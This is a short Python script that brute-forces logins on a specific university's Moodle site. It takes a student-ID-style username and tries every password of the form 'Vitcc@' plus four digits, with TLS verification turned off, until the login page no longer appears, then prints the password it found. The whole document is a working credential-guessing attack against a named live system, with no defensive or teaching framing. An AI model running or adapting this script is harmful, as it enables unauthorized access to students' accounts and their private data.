import requests 
import re
import sys
from urllib3.exceptions import InsecureRequestWarning
import time

requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
url = "https://moodlecc.vit.ac.in/login/index.php"
s = requests.session()
username = input().lower()

if not re.match(r"\d{2}\w{3}\d{4}", username):
    print("Sorry, invalid username")
    time.sleep(5)
    sys.exit(0)

for suffix in range(9999):
    password = "Vitcc@" + f"{suffix:04}"
    suc = {'username': username, 'password': password}
    check = s.post(url, data = suc, verify = False)
    if not re.search("Log in to the site", check.text):
        print("password: ", password)
        break
    else:
        print(password, "is wrong")
